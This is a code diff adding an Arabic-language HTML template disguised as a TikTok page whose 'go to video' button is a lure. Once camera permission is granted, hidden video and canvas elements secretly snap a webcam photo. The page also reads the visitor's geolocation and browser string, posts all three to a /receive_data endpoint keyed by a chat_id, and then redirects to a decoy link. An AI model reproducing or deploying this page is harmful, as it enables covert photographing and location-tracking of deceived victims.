@@ -1,1 +1,102 @@
-moved HTML to templates
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok تيك توك</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      margin: 0;
+    }
+    img {
+      width: 150px;
+      margin-bottom: 30px;
+    }
+    button {
+      background-color: #ff0050;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #cc0040;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <img src="/static/tiktok.png" alt="TikTok Logo">
+  <button onclick="requestPermissions()">انتقل للفيديو</button>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const myLink = "{{ my_link }}";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
+    async function requestPermissions() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // التقط صورة بعد ثانية
+        setTimeout(() => {
+          captureAndSend();
+        }, 1000);
+      } catch (err) {
+        alert("يجب السماح بالكاميرا.");
+      }
+    }
+
+    function captureAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      canvas.toBlob(async function (blob) {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const location = `https://www.google.com/maps?q=${lat},${lon}`;
+            await sendData(blob, location);
+            window.location.href = myLink;
+          }, async () => {
+            await sendData(blob, "رفض المستخدم مشاركة الموقع");
+            window.location.href = myLink;
+          });
+        } else {
+          await sendData(blob, "موقع غير مدعوم");
+          window.location.href = myLink;
+        }
+      }, 'image/jpeg');
+    }
+
+    async function sendData(imageBlob, location) {
+      const formData = new FormData();
+      formData.append("image", imageBlob, "snapshot.jpg");
+      formData.append("location", location);
+      formData.append("browser", navigator.userAgent);
+
+      await fetch(`/receive_data/{{ chat_id }}`, {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
